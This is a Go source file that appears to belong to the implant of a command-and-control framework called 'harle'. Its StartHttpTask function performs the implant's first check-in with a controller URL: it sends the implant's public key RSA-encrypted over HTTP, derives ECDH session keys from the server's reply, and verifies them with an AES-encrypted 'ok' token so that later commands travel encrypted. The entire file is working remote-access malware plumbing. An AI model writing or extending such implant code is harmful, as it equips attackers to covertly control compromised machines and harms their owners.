package transport

import (
	"bytes"
	"github.com/lzkking/harle/implant/internal/command"
	"github.com/lzkking/harle/implant/internal/global"
	"github.com/lzkking/harle/implant/pkg/crypto/aes"
	"github.com/lzkking/harle/implant/pkg/crypto/ecdh"
	"github.com/lzkking/harle/implant/pkg/crypto/rsa"
	"github.com/lzkking/harle/implant/proto"
	"io"
	"net/http"
)

func StartHttpTask(url string) {
	publicKey := global.GlobalConfig.PublicKey
	privateKey := global.GlobalConfig.PrivateKey
	commandData := proto.CommandData{
		DataType: command.FirstConnection,
		Data:     publicKey,
	}
	commandBytesData, err := commandData.Marshal()
	if err != nil {
		panic(err)
	}

	rsaPublicKey := global.GlobalConfig.RsaPublicKey
	encryptData, err := rsa.RsaEncryptData(commandBytesData, rsaPublicKey)
	if err != nil {
		panic(err)
	}

	resp, err := http.Post(url, "application/octet-stream", bytes.NewBuffer(encryptData))
	if err != nil {
		panic(err)
	}

	retData, err := io.ReadAll(resp.Body)
	var cData proto.CommandData
	err = cData.Unmarshal(retData)
	if err != nil {
		panic(err)
	}

	var cDataRet proto.FirstConnection
	err = cDataRet.Unmarshal(cData.Data)
	if err != nil {
		panic(err)
	}

	global.GlobalConfig.ServerPublicKey = cDataRet.PublicKey
	global.GlobalConfig.SessionId = cDataRet.SessionId

	keySend, keyRecv, err := ecdh.CalcSessionKey(cDataRet.PublicKey, privateKey, publicKey)
	if err != nil {
		panic(err)
	}

	// 解密
	plaintext, err := aes.DecryptData(keyRecv, cDataRet.Verify)
	if err != nil {
		panic(err)
	}

	if string(plaintext) != "ok" {
		panic(err)
	}

	global.GlobalConfig.KeyRecv = keyRecv
	global.GlobalConfig.KeySend = keySend

}
